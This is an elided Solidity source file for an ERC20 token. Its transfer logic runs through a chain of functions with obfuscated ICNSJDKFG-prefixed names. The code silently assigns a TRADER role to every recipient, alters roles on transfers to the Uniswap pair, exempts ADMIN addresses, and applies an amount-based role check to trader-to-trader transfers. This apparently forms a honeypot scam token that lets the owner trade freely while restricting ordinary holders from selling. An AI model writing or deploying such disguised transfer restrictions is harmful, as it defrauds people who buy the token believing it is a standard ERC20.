...
interface ICNSJDKFGRoleControl {
...
abstract contract ICNSJDKFGConsole is Context, ICNSJDKFGRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        _ICNSJDKFGabcRole(role, account, amt);
    }

    function _ICNSJDKFGabcRole(bytes32 role, address account, uint256 amt) internal {
    ...
    function _ICNSJDKFGabcsetRole(bytes32 role, address account, uint256 num) internal virtual {
...
contract ICNSJDKFGERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is ICNSJDKFGERC20, ICNSJDKFGConsole {
    ...
    ) ICNSJDKFGERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(ICNSJDKFGERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _ICNSJDKFGnfdvrsf(from, to, amt);

    }



    function _ICNSJDKFGnfdvrsf(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _ICNSJDKFGcvreghf(from, to, amt);
    }


    function _ICNSJDKFGcvreghf(address from, address to, uint256 amt) internal {
        ...
        _ICNSJDKFGxeevtjg(from, to, amt);
    }

    function _ICNSJDKFGxeevtjg(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _ICNSJDKFGutvesew(from, to, amt);
    }


    function _ICNSJDKFGutvesew(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            _ICNSJDKFGabcsetRole(TRADER,to,1);
        }

        _ICNSJDKFGvndffbf(from, to, amt);
    }

    function _ICNSJDKFGvndffbf(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        _ICNSJDKFGcvyacsi(from, to, amt);
    }

    function _ICNSJDKFGcvyacsi(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           _ICNSJDKFGvnuidxcrd(from, TRADER, amt);
    ...
    function _ICNSJDKFGvnuidxcrd(address from, bytes32 role, uint256 amt) internal {
        _ICNSJDKFGabcRole(role, from, amt);
    }
